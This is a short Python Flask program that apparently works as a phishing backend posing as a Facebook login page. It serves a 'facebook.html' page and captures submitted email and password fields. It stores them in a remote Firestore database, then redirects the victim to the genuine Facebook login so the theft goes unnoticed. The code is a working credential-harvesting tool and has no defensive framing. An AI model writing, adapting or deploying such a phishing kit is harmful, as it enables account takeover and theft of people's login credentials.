
import uuid
from flask import Flask, render_template,redirect, request
import firebase_admin
from firebase_admin import credentials
from firebase_admin import firestore

app = Flask(__name__) # obj

cred = credentials.Certificate('./serviceAccountKey.json')
firebase_admin.initialize_app(cred)
db = firestore.client()

x=5
y=4
if x==5:
    pass

@app.route("/facebook/<id>", methods=["GET","POST"])#Create url and get methods
def facebook(id):
    if request.method == "GET":#If its get, returns the web page.
        #if web == None:
            #return "Route didnt found."
        return render_template("facebook.html")
    #If its post, uplaod the parameters to the db.
    username = request.form.get("email")
    password = request.form.get("pax")
    try:
        db.collection("websites").document(f"{id}").update({f"{uuid.uuid1()}":{"user":username, "password":password}})
        return redirect("https://facebook.com/login")
    except Exception as e:
        print(f"Error: {e}")
        db.collection("websites").document(f"{id}").set({f"{uuid.uuid1()}":{"user":username, "password":password}})
        return redirect("https://facebook.com/login")



if __name__ == "__main__":
    #Run the proccess
    app.run(debug=True,port=80,host="0.0.0.0")




